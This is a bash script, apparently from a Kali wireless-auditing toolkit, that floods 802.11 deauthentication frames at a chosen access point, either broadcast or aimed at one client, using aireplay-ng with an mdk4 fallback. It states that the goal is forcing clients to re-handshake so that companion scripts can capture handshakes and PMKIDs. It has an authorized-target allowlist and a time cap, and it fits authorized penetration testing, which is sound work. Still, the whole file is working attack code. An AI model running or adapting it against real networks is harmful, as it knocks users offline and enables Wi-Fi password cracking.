#!/bin/bash
# =============================================================================
# deauth.sh  --  bounded, allowlist-gated 802.11 deauthentication (Kali module)
#
#   Usage:  deauth.sh <BSSID> [client_mac|all] [secs]
#
#     <BSSID>        target AP  (MUST be on authorized-targets.txt)
#     [client_mac]   deauth ONE station (targeted); or 'all' / omitted = broadcast
#     [secs]         duration, 1..120 (default 20) -- hard-capped, never runs forever
#
#   What it does:  soft-resets the adapter, enforces the HARD allowlist gate,
#   locks to the AP's channel, then streams deauth frames for <secs> with
#   aireplay-ng (falls back to mdk4 for broadcast). Clear START/STOP + RESULT.
#
#   Why you'd run it (authorized):  force a client to re-handshake (feeds
#   grab.sh/pmkid.sh), or demonstrate deauth resilience of your own AP.
#
#   AUTHORIZED TARGETS ONLY.
# =============================================================================
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
. "$HERE/common.sh" 2>/dev/null || { echo "RESULT=ERROR missing common.sh beside this script"; exit 1; }

cc_banner "deauth"

B="${1:-}"
TARGET="${2:-all}"
SECS="${3:-20}"
MAXSECS="${MAXSECS:-120}"

[ -z "$B" ] && cc_die "ERROR_USAGE deauth.sh <BSSID> [client_mac|all] [secs]" 1

# clamp duration to 1..MAXSECS (bounded by design)
case "$SECS" in (*[!0-9]*|'') SECS=20;; esac
[ "$SECS" -lt 1 ] && SECS=1
[ "$SECS" -gt "$MAXSECS" ] && SECS="$MAXSECS"

cc_need aireplay-ng airodump-ng
trap cc_cleanup EXIT

# --- safety: soft reset, then the HARD allowlist gate -----------------------
cc_soft_reset
cc_auth_gate "$B"
B="$(cc_norm "$B")"
IF="$(cc_iface)"

# targeted mode needs a valid client MAC; otherwise treat as broadcast
MODE="broadcast"; CLIENT=""
if [ "$TARGET" != "all" ] && [ -n "$TARGET" ]; then
  if cc_valid_mac "$TARGET"; then MODE="targeted"; CLIENT="$(cc_norm "$TARGET")"
  else cc_warn "ignoring bad client MAC '$TARGET' -> broadcast deauth"; fi
fi

# --- lock the AP's channel (deauth must be sent on the AP's channel) ---------
CH="$(cc_lock_channel "$B")" || true
[ -z "$CH" ] && cc_die "AP_NOT_FOUND bssid=$B (AP off / out of range / on 5GHz)" 0
cc_log "AP on channel $CH"

# --- run (duration-capped by timeout; aireplay --deauth 0 = continuous) ------
echo "DEAUTH_START bssid=$B mode=$MODE client=${CLIENT:-*} chan=$CH secs=$SECS"
rc=0
if [ "$MODE" = "targeted" ]; then
  # shellcheck disable=SC2024  # /tmp log is intentionally caller-owned; the radio op is the sudo'd part
  sudo timeout "$SECS" aireplay-ng --deauth 0 -a "$B" -c "$CLIENT" "$IF" >/tmp/cc-deauth.log 2>&1 || rc=$?
else
  # shellcheck disable=SC2024
  sudo timeout "$SECS" aireplay-ng --deauth 0 -a "$B" "$IF" >/tmp/cc-deauth.log 2>&1 || rc=$?
  # if aireplay broadcast produced nothing usable, back it up with mdk4
  if [ "$rc" != 0 ] && [ "$rc" != 124 ] && cc_have mdk4; then
    cc_warn "aireplay broadcast rc=$rc -> falling back to mdk4 deauth"
    sudo iw dev "$IF" set channel "$CH" 2>/dev/null
    # shellcheck disable=SC2024
    sudo timeout "$SECS" mdk4 "$IF" d -B "$B" >/tmp/cc-deauth-mdk4.log 2>&1 || rc=$?
    MODE="broadcast-mdk4"
  fi
fi
echo "DEAUTH_STOP"

# timeout returns 124 when it ends the run at the time cap -- that is success here
SENT="$(grep -aoE 'Sent [0-9]+ packets' /tmp/cc-deauth.log 2>/dev/null | tail -1)"
if [ "$rc" = 0 ] || [ "$rc" = 124 ]; then
  cc_result "DEAUTH_DONE bssid=$B mode=$MODE client=${CLIENT:-*} chan=$CH secs=$SECS ${SENT:+(${SENT})}"
else
  cc_result "DEAUTH_ERROR rc=$rc bssid=$B mode=$MODE chan=$CH (see /tmp/cc-deauth.log)"
fi
